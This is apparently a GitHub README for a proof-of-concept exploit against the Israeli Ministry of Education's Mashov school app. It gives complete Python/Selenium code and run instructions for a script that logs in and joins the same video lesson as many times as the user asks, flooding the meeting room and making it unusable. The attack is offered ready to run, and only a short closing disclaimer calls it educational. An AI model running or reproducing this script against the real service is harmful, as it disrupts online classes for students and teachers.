# Mashov App Vulnerability Exploit

## Overview

This project demonstrates a bug/vulnerability found in the Israeli Ministry of Education's app, Mashov. During lockdown times, this app was widely used for online education. The bug allows any user to repeatedly enter the same video meeting room, effectively flooding it and rendering it unusable.

## Proof of Concept (POC)

The POC is written in Python using Selenium to automate the browser actions. The script repeatedly logs into the Mashov app and joins the same video meeting multiple times.

## Requirements

- Python 3.x
- Selenium
- Chrome WebDriver
- Webdriver Manager for Python

## Installation

1. **Clone the repository**:
    ```sh
    git clone <repository_url>
    cd <repository_folder>
    ```

2. **Install dependencies**:
    ```sh
    pip install selenium webdriver-manager
    ```

3. **Download Chrome WebDriver**:
    The WebDriverManager will handle the downloading and setup of the Chrome WebDriver automatically.

## Usage

1. **Run the script**:
    ```sh
    python mashov_exploit.py
    ```

2. **Provide your details**:
    The script will prompt you to enter the following information:
    - **User name**: Your Mashov username.
    - **Password**: Your Mashov password.
    - **Lesson number**: The number of the lesson you want to join.
    - **Number of entries**: How many times you want to enter the lesson.

## Script Details

The script automates the following steps:

1. Open the Mashov login page.
2. Log in with the provided user credentials.
3. Navigate to the lessons menu.
4. Enter the specified lesson multiple times.

Here is the complete POC code:

```python
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import time

def enter_users(user_name, password, NUM_OF_ENTRIES, lesson_number):
    options = Options()
    options.add_experimental_option("detach", True)

    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

    driver.get("https://web.mashov.info/students/login")
    driver.maximize_window()
    time.sleep(2)

    # Enter login
    driver.find_element('xpath','/html/body/mshv-root/mshv-login/mat-card/mat-tab-group/mat-tab-header/div/div/div/div[2]/span[2]/span').click()
    time.sleep(1)
    driver.find_element('xpath','/html/body/mshv-root/mshv-login/mat-card/mat-tab-group/div/mat-tab-body[2]/div/div/button/span[2]').click()
    time.sleep(1)

    # Login details
    driver.find_element('xpath','/html/body/section/div[1]/div[3]/div[1]').click()
    # User name
    driver.find_element('xpath', '/html/body/section/div[1]/div[3]/form/fieldset/input[2]').send_keys(user_name)
    # Password
    driver.find_element('xpath', '/html/body/section/div[1]/div[3]/form/fieldset/span/input[4]').send_keys(password)
    # Send details
    driver.find_element('xpath','/html/body/section/div[1]/div[3]/form/fieldset/button').click()
    time.sleep(2)
    driver.find_element('xpath', '/html/body/mshv-root/mshv-login/mat-card/mat-tab-group/div/mat-tab-body[2]/div/div/button').click()
    time.sleep(2)

    # Enter the lessons menu
    driver.find_element('xpath', '/html/body/mshv-root/mshv-main/mat-sidenav-container/mat-sidenav/div/mshv-main-menu/ul/li[26]/button/span[2]/div').click()
    p = driver.current_window_handle

    for i in range(NUM_OF_ENTRIES):
        time.sleep(0.2)
        # Switch to main tab
        driver.switch_to.window(p)
        # Enter the selected lesson
        driver.find_element('xpath' ,f'/html/body/mshv-root/mshv-main/mat-sidenav-container/mat-sidenav-content/mshv-student/mshv-student-bbb/mat-card[2]/mat-nav-list/a[{lesson_number}]').click()

def main():
    """
    Provide your details:
    User name and password from משרד החינוך
    Lesson number
    Entry amount
    """
    user_name = input('Enter your user name: ')
    password = input('Enter your password: ')
    lesson_number = input('Enter your lesson number: ')
    NUM_OF_ENTRIES = int(input('Enter number of entries: '))
    enter_users(user_name, password, NUM_OF_ENTRIES, lesson_number)

if __name__ == '__main__':
    main()
```

## Disclaimer

This project is intended for educational purposes only. Exploiting vulnerabilities in any system without proper authorization is illegal and unethical. If you discover a vulnerability, please report it responsibly to the affected organization.
